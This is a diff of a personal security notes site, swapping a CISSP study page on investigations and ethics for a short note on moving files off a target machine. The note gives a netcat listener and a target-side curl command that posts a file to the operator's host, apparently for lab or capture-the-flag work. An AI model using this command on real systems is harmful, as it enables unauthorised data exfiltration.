@@ -8,28 +8,28 @@
       
       
       
-        <link rel="canonical" href="https://miranda-bai.github.io/CISSP%20Pre/7-Security%20Operations/Chapter%2019/">
+        <link rel="canonical" href="https://miranda-bai.github.io/Notes/Transfer%20file%20to%20local/">
       
       
-        <link rel="prev" href="../Chapter%2018/">
+        <link rel="prev" href="../Create%20multi%20shell/">
       
       
-        <link rel="next" href="../../8-Software%20Development%20Security/0-Overview/">
+        <link rel="next" href="../../Others/Job/">
       
       
-      <link rel="icon" href="../../../assets/logo.png">
+      <link rel="icon" href="../../assets/logo.png">
       <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.4">
     
     
       
-        <title>Chapter 19 Investigations and Ethics - Notes & Writeups</title>
+        <title>Transfer file from remote to local - Notes & Writeups</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.50c56a3b.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.50c56a3b.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -48,7 +48,7 @@
       
     
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#chapter-19-investigations-and-ethics" class="md-skip">
+        <a href="#transfer-file-from-remote-to-local" class="md-skip">
           Skip to content
         </a>
       
@@ -86,9 +86,9 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="Notes &amp; Writeups" class="md-header__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
+    <a href="../.." title="Notes &amp; Writeups" class="md-header__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
       
-  <img src="../../../assets/logo.png" alt="logo">
+  <img src="../../assets/logo.png" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -105,7 +105,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Chapter 19 Investigations and Ethics
+              Transfer file from remote to local
             
           </span>
         </div>
@@ -174,7 +174,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../.." class="md-tabs__link">
+      <a href="../.." class="md-tabs__link">
         
   
     
@@ -189,13 +189,11 @@
         
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
-        <a href="../../Glossaries/" class="md-tabs__link">
+      <li class="md-tabs__item">
+        <a href="../../CISSP%20Pre/Glossaries/" class="md-tabs__link">
           
   
   CISSP Pre
@@ -219,7 +217,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../HTB/Challenges/Distract%20and%20Destroy/" class="md-tabs__link">
+        <a href="../../HTB/Challenges/Distract%20and%20Destroy/" class="md-tabs__link">
           
   
   HTB
@@ -236,11 +234,13 @@
         
   
   
+    
+  
   
     
     
-      <li class="md-tabs__item">
-        <a href="../../../Notes/Create%20multi%20shell/" class="md-tabs__link">
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../Create%20multi%20shell/" class="md-tabs__link">
           
   
   Notes
@@ -258,7 +258,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../Others/Job/" class="md-tabs__link">
+        <a href="../../Others/Job/" class="md-tabs__link">
           
   
   Others
@@ -291,9 +291,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="Notes &amp; Writeups" class="md-nav__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
+    <a href="../.." title="Notes &amp; Writeups" class="md-nav__button md-logo" aria-label="Notes & Writeups" data-md-component="logo">
       
-  <img src="../../../assets/logo.png" alt="logo">
+  <img src="../../assets/logo.png" alt="logo">
 
     </a>
     Notes & Writeups
@@ -308,7 +308,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href="../.." class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -325,8 +325,6 @@
       
   
   
-    
-  
   
   
     
@@ -337,12 +335,12 @@
       
       
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
@@ -356,7 +354,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             CISSP Pre
@@ -370,7 +368,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Glossaries/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/Glossaries/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -391,7 +389,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Question%20review/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/Question%20review/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -449,7 +447,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../1-Security%20and%20Risk%20Management/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/1-Security%20and%20Risk%20Management/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -470,7 +468,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../1-Security%20and%20Risk%20Management/Chapter%201/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%201/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -491,7 +489,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../1-Security%20and%20Risk%20Management/Chapter%202/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%202/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -512,7 +510,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../1-Security%20and%20Risk%20Management/Chapter%203/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%203/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -533,7 +531,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../1-Security%20and%20Risk%20Management/Chapter%204/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/1-Security%20and%20Risk%20Management/Chapter%204/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -599,7 +597,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2-Asset%20Security/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/2-Asset%20Security/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -620,7 +618,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../2-Asset%20Security/Chapter%205/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/2-Asset%20Security/Chapter%205/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -686,7 +684,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3-Security%20Architecture%20and%20Engineering/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -707,7 +705,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3-Security%20Architecture%20and%20Engineering/Chapter%2010/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%2010/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -728,7 +726,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3-Security%20Architecture%20and%20Engineering/Chapter%206/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%206/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -749,7 +747,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3-Security%20Architecture%20and%20Engineering/Chapter%207/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%207/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -770,7 +768,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3-Security%20Architecture%20and%20Engineering/Chapter%208/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%208/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -791,7 +789,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../3-Security%20Architecture%20and%20Engineering/Chapter%209/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/3-Security%20Architecture%20and%20Engineering/Chapter%209/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -857,7 +855,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4-Communication%20and%20Network%20Security/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/4-Communication%20and%20Network%20Security/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -878,7 +876,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4-Communication%20and%20Network%20Security/Chapter%2011/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2011/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -899,7 +897,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../4-Communication%20and%20Network%20Security/Chapter%2012/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/4-Communication%20and%20Network%20Security/Chapter%2012/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -965,7 +963,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5-Identity%20and%20Access%20Managment/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -986,7 +984,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5-Identity%20and%20Access%20Managment/Chapter%2013/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2013/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1007,7 +1005,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../5-Identity%20and%20Access%20Managment/Chapter%2014/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/5-Identity%20and%20Access%20Managment/Chapter%2014/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1073,7 +1071,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../6-Security%20Assessment%20and%20Testing/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/6-Security%20Assessment%20and%20Testing/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1094,7 +1092,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../6-Security%20Assessment%20and%20Testing/Chapter%2015/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/6-Security%20Assessment%20and%20Testing/Chapter%2015/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1120,21 +1118,19 @@
                 
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_9" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_9" >
         
           
           <label class="md-nav__link" for="__nav_2_9" id="__nav_2_9_label" tabindex="0">
@@ -1148,7 +1144,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_9_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_9_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_2_9">
             <span class="md-nav__icon md-icon"></span>
             7 Security Operations
@@ -1162,7 +1158,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/7-Security%20Operations/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1183,7 +1179,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Chapter%2016/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/7-Security%20Operations/Chapter%2016/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1204,7 +1200,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Chapter%2017/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/7-Security%20Operations/Chapter%2017/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1225,7 +1221,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Chapter%2018/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/7-Security%20Operations/Chapter%2018/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1243,30 +1239,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Chapter 19 Investigations and Ethics
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../CISSP%20Pre/7-Security%20Operations/Chapter%2019/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1275,35 +1251,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#written-lab" class="md-nav__link">
-    <span class="md-ellipsis">
-      Written Lab
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1361,7 +1308,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../8-Software%20Development%20Security/0-Overview/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/8-Software%20Development%20Security/0-Overview/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1382,7 +1329,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../8-Software%20Development%20Security/Chapter%2020/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/8-Software%20Development%20Security/Chapter%2020/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1403,7 +1350,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../8-Software%20Development%20Security/Chapter%2021/" class="md-nav__link">
+      <a href="../../CISSP%20Pre/8-Software%20Development%20Security/Chapter%2021/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1516,7 +1463,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Challenges/Distract%20and%20Destroy/" class="md-nav__link">
+      <a href="../../HTB/Challenges/Distract%20and%20Destroy/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1537,7 +1484,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Challenges/Photon%20Lockdown/" class="md-nav__link">
+      <a href="../../HTB/Challenges/Photon%20Lockdown/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1603,7 +1550,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Bucket/" class="md-nav__link">
+      <a href="../../HTB/Machines/Bucket/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1624,11 +1571,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/FormulaX/" class="md-nav__link">
+      <a href="../../HTB/Machines/FormulaX/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    FormulaX - Season 4
+    [Protected] FormulaX - Season 4
   </span>
   
 
@@ -1645,11 +1592,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Headless/" class="md-nav__link">
+      <a href="../../HTB/Machines/Headless/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Headless - Season 4
+    [Protected] Headless - Season 4
   </span>
   
 
@@ -1666,11 +1613,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/IClean/" class="md-nav__link">
+      <a href="../../HTB/Machines/IClean/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    IClean - Released on 06 Apr 2024
+    [Protected] IClean - Released on 06 Apr 2024
   </span>
   
 
@@ -1687,11 +1634,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Jab/" class="md-nav__link">
+      <a href="../../HTB/Machines/Jab/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Jab - Season 4
+    [Protected] Jab - Season 4
   </span>
   
 
@@ -1708,11 +1655,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Mist/" class="md-nav__link">
+      <a href="../../HTB/Machines/Mist/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Mist - Season 4
+    [Protected] Mist - Season 4
   </span>
   
 
@@ -1729,11 +1676,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Monitored/" class="md-nav__link">
+      <a href="../../HTB/Machines/Monitored/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Monitored - Season 4
+    [Protected] Monitored - Season 4
   </span>
   
 
@@ -1750,11 +1697,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Office/" class="md-nav__link">
+      <a href="../../HTB/Machines/Office/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Office - Season 4
+    [Protected] Office - Season 4
   </span>
   
 
@@ -1771,11 +1718,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/Perfection/" class="md-nav__link">
+      <a href="../../HTB/Machines/Perfection/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Perfection - Season 4
+    [Protected] Perfection - Season 4
   </span>
   
 
@@ -1792,7 +1739,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/SteamCloud/" class="md-nav__link">
+      <a href="../../HTB/Machines/SteamCloud/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1813,11 +1760,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../HTB/Machines/WifineticTwo/" class="md-nav__link">
+      <a href="../../HTB/Machines/WifineticTwo/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    WifineticTwo - Season 4
+    [Protected] WifineticTwo - Season 4
   </span>
   
 
@@ -1846,8 +1793,10 @@
       
   
   
+    
   
   
+  
     
     
     
@@ -1856,12 +1805,12 @@
       
       
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
@@ -1875,7 +1824,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             Notes
@@ -1889,7 +1838,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Notes/Create%20multi%20shell/" class="md-nav__link">
+      <a href="../Create%20multi%20shell/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1907,10 +1856,19 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../../Notes/Transfer%20file%20to%20local/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -1919,6 +1877,7 @@
   
 
       </a>
+      
     </li>
   
 
@@ -1978,7 +1937,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Others/Job/" class="md-nav__link">
+      <a href="../../Others/Job/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1999,7 +1958,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Others/NZISM%26PSR/" class="md-nav__link">
+      <a href="../../Others/NZISM%26PSR/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2020,7 +1979,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/" class="md-nav__link">
+      <a href="../../Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2061,23 +2020,6 @@
     
   
   
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#written-lab" class="md-nav__link">
-    <span class="md-ellipsis">
-      Written Lab
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
 </nav>
                   </div>
                 </div>
@@ -2091,27 +2033,14 @@
                   
 
 
-<h1 id="chapter-19-investigations-and-ethics">Chapter 19 Investigations and Ethics</h1>
-<p><strong>Domain 1 &amp; 7</strong></p>
-<h2 id="written-lab">Written Lab</h2>
-<ol>
-<li>
-<p>What are the major categories of computer crime?</p>
-<p>The major categories of computer crime are military/intelligence attacks, business attacks, financial attacks, terrorist attacks, grudge attacks, and thrill attacks.</p>
-</li>
-<li>
-<p>What is the main motivation behind a thrill attack?</p>
-<p>Thrill attacks are motivated by individuals seeking to achieve the "high" associated with successfully breaking into a computer system.</p>
-</li>
-<li>
-<p>What is the difference between an interview and an interrogation?</p>
-<p>Interviews are conducted with the intention of gathering information from individuals to assist with your investigation. Interrogations are conducted with the intent of gathering evidence from suspects to be used in a criminal prosecution.</p>
-</li>
-<li>
-<p>What are the three basic requirements that evidence must meet in order to be admissible in court?</p>
-<p>To be admissible, evidence must be reliable, competent, and material to the case.</p>
-</li>
-</ol>
+<h1 id="transfer-file-from-remote-to-local">Transfer file from remote to local</h1>
+<pre><code class="language-bash"># local
+$ nc -lvkp 6000 &gt; save.bin
+
+# target
+cmd.exe /c curl -F &quot;file=@save.exe&quot; myip:6000
+</code></pre>
+<p>when it's completed, delete several lines in the head and tail of the bin file.</p>
 
 
 
@@ -2132,7 +2061,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">March 30, 2024</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">April 12, 2024</span>
   </span>
 
     
@@ -2179,10 +2108,10 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.path", "navigation.tabs"], "search": "../../../assets/javascripts/workers/search.c011b7c0.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.path", "navigation.tabs"], "search": "../../assets/javascripts/workers/search.c011b7c0.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.7389ff0e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.7389ff0e.min.js"></script>
       
     
   </body>
